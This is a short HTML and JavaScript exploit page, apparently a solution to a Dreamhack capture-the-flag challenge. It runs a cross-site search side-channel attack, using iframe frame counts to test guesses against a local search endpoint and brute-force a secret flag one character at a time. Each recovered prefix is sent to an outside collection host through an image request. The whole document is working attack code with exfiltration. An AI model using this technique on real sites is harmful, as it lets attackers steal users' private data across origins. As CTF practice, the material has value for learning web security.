<iframe id="iframe"></iframe>
<img id="img">

<script>


    async function req(url) {

        return await new Promise((resolve, reject) => {

            const iframe = document.getElementById("iframe");
            iframe.src = url;

            iframe.onload = () => {

                if(iframe.contentWindow.frames.length == 1) {

                    resolve();

                }
                else {

                    reject();

                }

            };

        });

    }

    async function search(query) {

        try {

            await req(`http://127.0.0.1:8000/search?query=${query}`);
            return true;

        } catch (e) {

            return false;

        }

    }

    async function exploit() {

        let str = "0123456789abcdef}";
        let FLAG = "DH{";

        while(!FLAG.includes("}")) {

            for(let ch of str) {

                if(await search(FLAG+ch)) {

                    FLAG += ch;
                    img.src = `https://wvndpqo.request.dreamhack.games/${FLAG}`;
                    break;

                }

            }

        }

    }
    exploit();

</script>
